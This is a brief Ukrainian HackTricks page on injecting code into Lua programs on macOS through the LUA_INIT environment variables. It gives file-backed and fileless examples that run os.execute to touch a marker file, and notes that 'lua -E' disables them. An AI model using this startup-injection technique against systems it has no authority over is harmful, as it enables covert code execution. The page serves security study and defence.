# Ін’єкція в застосунки Lua на macOS

{{#include ../../../banners/hacktricks-training.md}}

## `LUA_INIT`

Перед обробкою параметрів командного рядка або цільового скрипту standalone-інтерпретатор Lua виконує `LUA_INIT_<major>_<minor>` або, якщо versioned-змінна відсутня, `LUA_INIT`. Значення, що починається з `@`, визначає файл; будь-яке інше значення безпосередньо виконується як Lua-код. Це забезпечує виконання під час запуску як із файлу, так і без файлу.<sup>[[1]](#references)</sup>
```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```
Точна версійна назва змінюється залежно від інтерпретатора, наприклад `LUA_INIT_5_4`. `lua -E` ігнорує всі змінні середовища, включно з кодом запуску та шляхами до модулів Lua.

## References

- [1] [Автономний інтерпретатор Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
{{#include ../../../banners/hacktricks-training.md}}
